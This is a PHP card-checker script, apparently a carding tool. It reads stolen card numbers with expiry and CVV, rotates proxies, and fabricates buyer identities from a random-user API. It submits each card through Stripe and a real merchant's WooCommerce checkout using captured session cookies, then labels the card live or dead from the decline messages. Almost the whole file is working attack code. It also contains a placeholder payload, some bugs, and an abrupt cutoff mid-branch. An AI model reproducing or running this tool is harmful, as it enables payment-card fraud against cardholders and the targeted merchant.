<?php 
////////////////////////////===RAW BY HARIS===////////////////////////////
require 'function.php';

error_reporting(0);
date_default_timezone_set('America/New_York');

if ($_SERVER['REQUEST_METHOD'] == "POST") {
    extract($_POST);
} elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
    extract($_GET);
}
function GetStr($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);  
    return $str[0];
}
function inStr($string, $start, $end, $value) {
    $str = explode($start, $string);
    $str = explode($end, $str[$value]);
    return $str[0];
}
$separa = explode("|", $lista);
$cc = $separa[0];
$mes = $separa[1];
$ano = $separa[2];
$cvv = $separa[3];

function rebootproxys()
{
  $poxySocks = file("proxy.txt");
  $myproxy = rand(0, sizeof($poxySocks) - 1);
  $poxySocks = $poxySocks[$myproxy];
  return $poxySocks;
}
$poxySocks4 = rebootproxys();

$number1 = substr($ccn,0,4);
$number2 = substr($ccn,4,4);
$number3 = substr($ccn,8,4);
$number4 = substr($ccn,12,4);
$number6 = substr($ccn,0,6);

function value($str,$find_start,$find_end)
{
    $start = @strpos($str,$find_start);
    if ($start === false) 
    {
        return "";
    }
    $length = strlen($find_start);
    $end    = strpos(substr($str,$start +$length),$find_end);
    return trim(substr($str,$start +$length,$end));
}

function mod($dividendo,$divisor)
{
    return round($dividendo - (floor($dividendo/$divisor)*$divisor));
}

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://randomuser.me/api/?nat=us');
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIE, 1); 
curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
$resposta = curl_exec($ch);
$firstname = value($resposta, '"first":"', '"');
$lastname = value($resposta, '"last":"', '"');
$phone = value($resposta, '"phone":"', '"');
$zip = value($resposta, '"postcode":', ',');
$state = value($resposta, '"state":"', '"');
$email = value($resposta, '"email":"', '"');
$city = value($resposta, '"city":"', '"');
$street = value($resposta, '"street":"', '"');
$numero1 = substr($phone, 1,3);
$numero2 = substr($phone, 6,3);
$numero3 = substr($phone, 10,4);
$phone = $numero1.''.$numero2.''.$numero3;
$serve_arr = array("gmail.com","homtail.com","yahoo.com.br","bol.com.br","yopmail.com","outlook.com");
$serv_rnd = $serve_arr[array_rand($serve_arr)];
$email= str_replace("example.com", $serv_rnd, $email);
if($state=="Alabama"){ $state="AL";
}else if($state=="alaska"){ $state="AK";
}else if($state=="arizona"){ $state="AR";
}else if($state=="california"){ $state="CA";
}else if($state=="olorado"){ $state="CO";
}else if($state=="connecticut"){ $state="CT";
}else if($state=="delaware"){ $state="DE";
}else if($state=="district of columbia"){ $state="DC";
}else if($state=="florida"){ $state="FL";
}else if($state=="georgia"){ $state="GA";
}else if($state=="hawaii"){ $state="HI";
}else if($state=="idaho"){ $state="ID";
}else if($state=="illinois"){ $state="IL";
}else if($state=="indiana"){ $state="IN";
}else if($state=="iowa"){ $state="IA";
}else if($state=="kansas"){ $state="KS";
}else if($state=="kentucky"){ $state="KY";
}else if($state=="louisiana"){ $state="LA";
}else if($state=="maine"){ $state="ME";
}else if($state=="maryland"){ $state="MD";
}else if($state=="massachusetts"){ $state="MA";
}else if($state=="michigan"){ $state="MI";
}else if($state=="minnesota"){ $state="MN";
}else if($state=="mississippi"){ $state="MS";
}else if($state=="missouri"){ $state="MO";
}else if($state=="montana"){ $state="MT";
}else if($state=="nebraska"){ $state="NE";
}else if($state=="nevada"){ $state="NV";
}else if($state=="new hampshire"){ $state="NH";
}else if($state=="new jersey"){ $state="NJ";
}else if($state=="new mexico"){ $state="NM";
}else if($state=="new york"){ $state="LA";
}else if($state=="north carolina"){ $state="NC";
}else if($state=="north dakota"){ $state="ND";
}else if($state=="Ohio"){ $state="OH";
}else if($state=="oklahoma"){ $state="OK";
}else if($state=="oregon"){ $state="OR";
}else if($state=="pennsylvania"){ $state="PA";
}else if($state=="rhode Island"){ $state="RI";
}else if($state=="south carolina"){ $state="SC";
}else if($state=="south dakota"){ $state="SD";
}else if($state=="tennessee"){ $state="TN";
}else if($state=="texas"){ $state="TX";
}else if($state=="utah"){ $state="UT";
}else if($state=="vermont"){ $state="VT";
}else if($state=="virginia"){ $state="VA";
}else if($state=="washington"){ $state="WA";
}else if($state=="west virginia"){ $state="WV";
}else if($state=="wisconsin"){ $state="WI";
}else if($state=="wyoming"){ $state="WY";
}else{$state="KY";} 

////////////////////////////===[1 Req]

curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/sources');
curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: api.stripe.com',
'method: POST',
'path: /v1/sources',
'scheme: https',
'accept: application/json',
'accept-language: en-US,en;q=0.9',
'content-type: application/x-www-form-urlencoded',
'origin: https://js.stripe.com',
'referer: https://js.stripe.com/',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-site',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');

////////////////////////////===[1 Req Postfields]

curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&owner[name]='.$firstname.'+'.$lastname.'&owner[address][line1]='.$street.'&owner[address][state]='.$state.'&owner[address][city]='.$city.'&owner[address][postal_code]='.$zip.'&owner[address][country]=US&owner[email]='.$email.'&owner[phone]='.$phone.'&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=4a0de65f-beb6-46fc-a732-2d8798131be7dd0ea5&muid=5f8f331c-4ff7-49b9-9d32-079f00adf4b2941850&sid=e328b170-6692-4915-a605-7cedf32103d8e8d3d6&pasted_fields=number&payment_user_agent=stripe.js%2F66b9a6439%3B+stripe-js-v3%2F66b9a6439&time_on_page=34933&key=pk_live_6O3PxWdGTmmaoSX3AODNlzhy');

$result1 = curl_exec($ch);
$id = trim(strip_tags(getStr($result1,'"id": "','"')));

////////////////////////////===[2 Req]

curl_setopt($ch, CURLOPT_URL, 'https://lawofselfdefense.com/?wc-ajax=checkout');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: lawofselfdefense.com',
'method: POST',
'path: /?wc-ajax=checkout',
'scheme: https',
'accept: application/json, text/javascript, */*; q=0.01',
'accept-language: en-US,en;q=0.9',
'content-type: application/x-www-form-urlencoded; charset=UTF-8',
'cookie: __cf_bm=QS6xTDs4a7ubfQpxPRIDQ.btwEyE.02hZ0E0TWqdOSw-1674552456-0-ARCSMaEw51psVW63Uhbaebf3uT1spXy1O5H9nwRzCr9/0QZYPkJZ48cmcaX2wPQ6Fsq0IDmaXzcKPfhnxZMFNPc=; pys_session_limit=true; pys_start_session=true; pys_first_visit=true; pysTrafficSource=google.com; pys_landing_page=https://lawofselfdefense.com/join/; last_pysTrafficSource=google.com; last_pys_landing_page=https://lawofselfdefense.com/join/; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2023-01-24%2009%3A27%3A42%7C%7C%7Cep%3Dhttps%3A%2F%2Flawofselfdefense.com%2Fjoin%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F; sbjs_first_add=fd%3D2023-01-24%2009%3A27%3A42%7C%7C%7Cep%3Dhttps%3A%2F%2Flawofselfdefense.com%2Fjoin%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F; sbjs_current=typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cmtke%3D%28none%29; sbjs_first=typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cmtke%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F109.0.0.0%20Safari%2F537.36; _gcl_au=1.1.825253692.1674552462; _ga=GA1.2.495281722.1674552463; _gid=GA1.2.52351448.1674552463; _gat_gtag_UA_135556748_1=1; _fbp=fb.1.1674552462897.1151947028; _tt_enable_cookie=1; _ttp=I20vQa1mCshxucBXpLZvibPjA_r; prism_650120125=be9a1f93-19bb-4f41-af3f-4caca77df5a6; ___i=MTEwLjc0LjIwNi4yMDc=; woocommerce_items_in_cart=1; wp_woocommerce_session_3a2c6f8739227804c45edd5e9cb4448e=t_40b9c5d8b0fb534775687a76b5ddcd%7C%7C1674725266%7C%7C1674721666%7C%7C972e43bc2e5c88b67e3cd6e65d4dc6e4; __stripe_mid=5f8f331c-4ff7-49b9-9d32-079f00adf4b2941850; __stripe_sid=e328b170-6692-4915-a605-7cedf32103d8e8d3d6; sbjs_session=pgs%3D3%7C%7C%7Ccpg%3Dhttps%3A%2F%2Flawofselfdefense.com%2Fcheckout%2F; wfocu_si=42aa22ad8751bddd2830e21c3b91792b; woocommerce_cart_hash=3b50f43978311583de746994463e315b',
'origin: https://lawofselfdefense.com',
'referer: https://lawofselfdefense.com/checkout/',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-origin',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
));

////////////////////////////===[2 Req Postfields]////////////////////////////

curl_setopt($ch, CURLOPT_POSTFIELDS,'#########Replace##########');

$result2 = curl_exec($ch);
$token = trim(strip_tags(getStr($result2,'"id": "','"')));

////////////////////////////===[BIN Info]

$cctwo = substr("$cc", 0, 6);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cctwo.'');
curl_setopt($ch, CURLOPT_USERAGENT, $user_agent);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$fim = curl_exec($ch);
$fim = json_decode($fim,true);
$emoji = $fim['country']['emoji'];
$type = $fim['type'];

if(strpos($fim, '"type":"credit"') !== false) {
  $type = 'Credit';
} else {
  $type = 'Debit';
}

////////////////////////////===[Responses CVV]===////////////////////////////

if
(strpos($result2,  '"cvc_check": "pass"')) {
  echo "<font size=2 color='red'>  <font class='badge badge-dark'>ᴀꜱᴛʀᴏ ᴄᴠᴠ | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>#DIE CVV ▸ 𝘈𝘱𝘱𝘳𝘰𝘷𝘦𝘥 𝘊𝘷𝘷</i></font><br> <font class='badge badge-dark'> $bank $country 𝗔𝗦𝗧𝗥𝗢𝘅𝗛𝗔𝗥𝗜𝗦 </i></font><br>";
}

elseif
(strpos($result2,  "Thank You For Donation.")) {
  echo "<font size=2 color='red'>  <font class='badge badge-dark'>ᴀꜱᴛʀᴏ ᴄᴠᴠ | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>#DIE CVV ▸ 𝘈𝘱𝘱𝘳𝘰𝘷𝘦𝘥 𝘊𝘷𝘷</i></font><br> <font class='badge badge-dark'> $bank $country 𝗔𝗦𝗧𝗥𝗢𝘅𝗛𝗔𝗥𝗜𝗦 </i></font><br>";
}
elseif
(strpos($result2,  '"Thank You For Donation."')) {
  echo "<font size=2 color='red'>  <font class='badge badge-dark'>ᴀꜱᴛʀᴏ ᴄᴠᴠ | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>#DIE CVV ▸ 𝘈𝘱𝘱𝘳𝘰𝘷𝘦𝘥 𝘊𝘷𝘷</i></font><br> <font class='badge badge-dark'> $bank $country 𝗔𝗦𝗧𝗥𝗢𝘅𝗛𝗔𝗥𝗜𝗦 </i></font><br>";
}

elseif
(strpos($result2,  "Thank You.")) {
  echo "<font size=2 color='red'>  <font class='badge badge-dark'>ᴀꜱᴛʀᴏ ᴄᴠᴠ | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>#DIE CVV ▸ 𝘈𝘱𝘱𝘳𝘰𝘷𝘦𝘥 𝘊𝘷𝘷</i></font><br> <font class='badge badge-dark'> $bank $country 𝗔𝗦𝗧𝗥𝗢𝘅𝗛𝗔𝗥𝗜𝗦 </i></font><br>";
}

elseif
(strpos($result2,  'Your card zip code is incorrect.')) {
  echo "<font size=2 color='red'>  <font class='badge badge-dark'>ᴀꜱᴛʀᴏ ᴄᴠᴠ | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>#DIE CVV ▸ 𝘈𝘱𝘱𝘳𝘰𝘷𝘦𝘥 𝘊𝘷𝘷</i></font><br> <font class='badge badge-dark'> $bank $country 𝗔𝗦𝗧𝗥𝗢𝘅𝗛𝗔𝗥𝗜𝗦 </i></font><br>";
} 
elseif
(strpos($result2,  '/donations/thank_you?donation_number=','')) {
  echo "<font size=2 color='red'>  <font class='badge badge-dark'>ᴀꜱᴛʀᴏ ᴄᴠᴠ | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>#DIE CVV ▸ 𝘈𝘱𝘱𝘳𝘰𝘷𝘦𝘥 𝘊𝘷𝘷</i></font><br> <font class='badge badge-dark'> $bank $country 𝗔𝗦𝗧𝗥𝗢𝘅𝗛𝗔𝗥𝗜𝗦 </i></font><br>";
}

elseif
(strpos($result2,  "incorrect_zip")) {
  echo "<font size=2 color='red'>  <font class='badge badge-dark'>ᴀꜱᴛʀᴏ ᴄᴠᴠ | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>#DIE CVV ▸ 𝘈𝘱𝘱𝘳𝘰𝘷𝘦𝘥 𝘊𝘷𝘷</i></font><br> <font class='badge badge-dark'> $bank $country 𝗔𝗦𝗧𝗥𝗢𝘅𝗛𝗔𝗥𝗜𝗦 </i></font><br>";
}

elseif
(strpos($result2,  '"type":"one-time"')) {
  echo "<font size=2 color='red'>  <font class='badge badge-dark'>ᴀꜱᴛʀᴏ ᴄᴠᴠ | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>#DIE CVV ▸ 𝘈𝘱𝘱𝘳𝘰𝘷𝘦𝘥 𝘊𝘷𝘷</i></font><br> <font class='badge badge-dark'> $bank $country 𝗔𝗦𝗧𝗥𝗢𝘅𝗛𝗔𝗥𝗜𝗦 </i></font><br>";
}


////////////////////////////===[Responses CCN]===////////////////////////////

elseif
(strpos($result2,  'security code is incorrect.')) {
  echo "<font size=2 color='red'>  <font class='badge badge-dark'>ᴀꜱᴛʀᴏ ʟɪᴠᴇ: | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>  Response: CCN LIVE✅</i></font><br> <font class='badge badge-dark'> $bank $country 𝗔𝗦𝗧𝗥𝗢𝘅𝗛𝗔𝗥𝗜𝗦 </i></font><br>";
}

elseif
(strpos($result2,  'Your card&#039;s security code is incorrect.')) {
  echo "<font size=2 color='red'>  <font class='badge badge-dark'>ᴀꜱᴛʀᴏ ʟɪᴠᴇ: | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>Response: CCN LIVE✅</i></font><br> <font class='badge badge-dark'> $bank $country 𝗔𝗦𝗧𝗥𝗢𝘅𝗛𝗔𝗥𝗜𝗦 </i></font><br>";
}

elseif
(strpos($result2,  "incorrect_cvc")) {
  echo "<font size=2 color='red'>  <font class='badge badge-dark'>ᴀꜱᴛʀᴏ ʟɪᴠᴇ: | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>Response: CCN LIVE✅</i></font><br> <font class='badge badge-dark'> $bank $country 𝗔𝗦𝗧𝗥𝗢𝘅𝗛𝗔𝗥𝗜𝗦 </i></font><br>";
}

elseif
(strpos($result2,  'Your card has insufficient funds.')) {
  echo "<font size=2 color='red'>  <font class='badge badge-dark'>ᴀꜱᴛʀᴏ ʟɪᴠᴇ: | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>Insufficient Funds✅ </i></font><br> <font class='badge badge-dark'> $bank $country 𝗔𝗦𝗧𝗥𝗢𝘅𝗛𝗔𝗥𝗜𝗦 </i></font><br>";
}

elseif
(strpos($result2,  "insufficient_funds")) {
  echo "<font size=2 color='red'>  <font class='badge badge-dark'>ᴀꜱᴛʀᴏ ʟɪᴠᴇ: | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>Insufficient Funds✅ </i></font><br> <font class='badge badge-dark'> $bank $country 𝗔𝗦𝗧𝗥𝗢𝘅𝗛𝗔𝗥𝗜𝗦 </i></font><br>";
}

elseif
(strpos($result2,  '"cvc_check": "fail"')) {
  echo "<font size=2 color='red'>  <font class='badge badge-dark'>ᴀꜱᴛʀᴏ ʟɪᴠᴇ: | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>Response: CCN LIVE✅</i></font><br> <font class='badge badge-dark'> $bank $country 𝗔𝗦𝗧𝗥𝗢𝘅𝗛𝗔𝗥𝗜𝗦 </i></font><br>";
}

elseif
(strpos($result2,  'security code is invalid.')) {
  echo "<font size=2 color='red'>  <font class='badge badge-dark'>ᴀꜱᴛʀᴏ ʟɪᴠᴇ: | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>Response: CCN LIVE✅</i></font><br> <font class='badge badge-dark'> $bank $country 𝗔𝗦𝗧𝗥𝗢𝘅𝗛𝗔𝗥𝗜𝗦 </i></font><br>";
}

elseif
(strpos($result2,  'Your card&#039;s security code is incorrect.')) {
  echo "<font size=2 color='red'>  <font class='badge badge-dark'>ᴀꜱᴛʀᴏ ʟɪᴠᴇ: | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>Response: CCN LIVE✅</i></font><br> <font class='badge badge-dark'> $bank $country 𝗔𝗦𝗧𝗥𝗢𝘅𝗛𝗔𝗥𝗜𝗦 </i></font><br>";
}

elseif
(strpos($result2,  "incorrect_cvc")) {
  echo "<font size=2 color='red'>  <font class='badge badge-dark'>ᴀꜱᴛʀᴏ ʟɪᴠᴇ: | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>Response: CCN LIVE✅</i></font><br> <font class='badge badge-dark'> $bank $country 𝗔𝗦𝗧𝗥𝗢𝘅𝗛𝗔𝗥𝗜𝗦 </i></font><br>";
}

////////////////////////////===[Responses DIE]===////////////////////////////



elseif
(strpos($result2,  'security code is invalid.')) {
  echo "<font size=2 color='red'>  <font class='badge badge-danger'>#DIE | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-danger'>Invalid CVC ❌</i></font><br>";
}


elseif
(strpos($result2,  "stolen_card")) {
  echo "<font size=2 color='red'>  <font class='badge badge-danger'>#DIE | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-danger'>Stolen Card ❌</i></font><br>";
}

elseif
(strpos($result2,  "lost_card")) {
  echo "<font size=2 color='red'>  <font class='badge badge-danger'>#DIE | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-danger'>Lost Card ❌</i></font><br>";
}


elseif
(strpos($result2,  "pickup_card")) {
  echo "<font size=2 color='red'>  <font class='badge badge-danger'>#DIE | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-danger'>Pickup Card ❌</i></font><br>";
}

elseif
(strpos($result2,  "stolen_card")) {
  echo "<font size=2 color='red'>  <font class='badge badge-danger'>#DIE | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-danger'>Stolen Card ❌</i></font><br>";
}

elseif
(strpos($result2,  "lost_card")) {
  echo "<font size=2 color='red'>  <font class='badge badge-danger'>#DIE | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-danger'>Lost Card ❌</i></font><br>";
}

elseif
(strpos($result2,  'Your card has insufficient funds.')) {
  echo "<font size=2 color='red'>  <font class='badge badge-danger'>ᴀꜱᴛʀᴏ ʟɪᴠᴇ: | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-danger'>Insufficient Funds </i></font><br>";
}

elseif
(strpos($result2,  "pickup_card")) {
  echo "<font size=2 color='red'>  <font class='badge badge-danger'>#DIE | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-danger'>Pickup Card ❌</i></font><br>";
}

elseif
(strpos($result2,  "insufficient_funds")) {
  echo "<font size=2 color='red'>  <font class='badge badge-danger'>ᴀꜱᴛʀᴏ ʟɪᴠᴇ: | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-danger'>Insufficient Funds </i></font><br>";
}

elseif
(strpos($result2,  'Your card has expired.')) {
  echo "<font size=2 color='red'>  <font class='badge badge-danger'>#DIE | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-danger'>Card Expired ❌</i></font><br>";
}

elseif
(strpos($result2,  'Your card number is incorrect.')) {
  echo "<font size=2 color='red'>  <font class='badge badge-danger'>#DIE | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-danger'>Incorrect Card Number ❌</i></font><br>";
}

elseif
(strpos($result2,  "incorrect_number")) {
  echo "<font size=2 color='red'>  <font class='badge badge-danger'>#DIE | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-danger'>Incorrect Card Number ❌</i></font><br>";
}

elseif
(strpos($result2,  'card was #DIE.')) {
  echo "<font size=2 color='red'>  <font class='badge badge-danger'>#DIE | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-danger'>Card #DIE ❌</i></font><br>";
}

elseif
(strpos($result2,  "generic_decline")) {
  echo "<font size=2 color='red'>  <font class='badge badge-danger'>#DIE | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-danger'>Generic Decline ❌</i></font><br>";
}

elseif
(strpos($result2,  "do_not_honor")) {
  echo "<font size=2 color='red'>  <font class='badge badge-danger'>#DIE | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-danger'>Do Not Honor ❌</i></font><br>";
}

elseif
(strpos($result2,  "expired_card")) {
  echo "<font size=2 color='red'>  <font class='badge badge-danger'>#DIE | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-danger'>Expired Card ❌</i></font><br>";
}

elseif
(strpos($result2,  'Your card does not support this type of purchase.')) {
  echo "<font size=2 color='red'>  <font class='badge badge-danger'>#DIE | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-danger'>Card Doesnt Support This Purchase ❌</i></font><br>";
}

elseif
(strpos($result2,  "processing_error")) {
  echo "<font size=2 color='red'>  <font class='badge badge-danger'>#DIE | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-danger'>Processing Error ❌</i></font><br>";
}

elseif
(strpos($result2, "service_not_allowed")) {
  echo "<font size=2 color='red'>  <font class='badge badge-danger'>#DIE | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-danger'>Service Not Allowed ❌</i></font><br>";
}

elseif
(strpos($result2,  '"cvc_check": "unchecked"')) {
  echo "<font size=2 color='red'>  <font class='badge badge-danger'>#DIE | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-danger'>CVC Check Unavailable ❌</i></font><br>";
}

elseif
(strpos($result2,  '"cvc_check": "unavailable"')) {
  echo "<font size=2 color='red'>  <font class='badge badge-danger'>#DIE | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-danger'>CVC Check Unavailable ❌</i></font><br>";
}

elseif
(strpos($result2,  "parameter_invalid_empty")) {
  echo "<font size=2 color='red'>  <font class='badge badge-danger'>#DIE | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-danger'>#DIE: Missing Card Details ❌</i></font><br>";
}

elseif
(strpos($result2,  "lock_timeout")) {
  echo "<font size=2 color='red'>  <font class='badge badge-danger'>#DIE | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-danger'>Another Request In Process: Card Not Checked ❌</i></font><br>";
}

elseif
(strpos($result2,  "transaction_not_allowed")) {
  echo "<font size=2 color='red'>  <font class='badge badge-danger'>#DIE | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-danger'>Transaction Not Allowed ❌</i></font><br>";
}

elseif
(strpos($result2, "three_d_secure_redirect")) {
  echo "<font size=2 color='red'>  <font class='badge badge-danger'>#DIE | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-danger'>3D Secure Redirect ❌</i></font><br>";
}

elseif
(strpos($result2,  'Card is #DIE ▸cc check by your bank, please contact them for additional information.')) {
  echo "<font size=2 color='red'>  <font class='badge badge-danger'>#DIE | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-danger'>3D Secure Redirect ❌</i></font><br>";
}

elseif
(strpos($result2, "missing_payment_information")) {
  echo "<font size=2 color='red'>  <font class='badge badge-danger'>#DIE | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-danger'>Missing Payment Informations ❌</i></font><br>";
}

elseif
(strpos($result2, "Payment cannot be processed, missing credit card number")) {
  echo "<font size=2 color='red'>  <font class='badge badge-danger'>#DIE | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-danger'>Missing Credit Card Number ❌</i></font><br>";
}

elseif
(strpos($result2,  'Your card has expired.')) {
  echo "<font size=2 color='red'>  <font class='badge badge-danger'>#DIE | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-danger'>Card Expired ❌</i></font><br>";
}

elseif
(strpos($result2,  'card number is incorrect.')) {
  echo "<font size=2 color='red'>  <font class='badge badge-danger'>#DIE | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-danger'>Incorrect Card Number ❌</i></font><br>";
}

elseif
(strpos($result2,  "incorrect_number")) {
  echo "<font size=2 color='red'>  <font class='badge badge-danger'>#DIE | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-danger'>Incorrect Card Number ❌</i></font><br>";
}

elseif
(strpos($result2,  'card was #DIE.')) {
  echo "<font size=2 color='red'>  <font class='badge badge-danger'>#DIE | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-danger'>Card #DIE ❌</i></font><br>";
}

elseif
(strpos($result2,  "generic_decline")) {
  echo "<font size=2 color='red'>  <font class='badge badge-danger'>#DIE | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-danger'>Generic Decline ❌</i></font><br>";
}

elseif
(strpos($result2,  "do_not_honor")) {
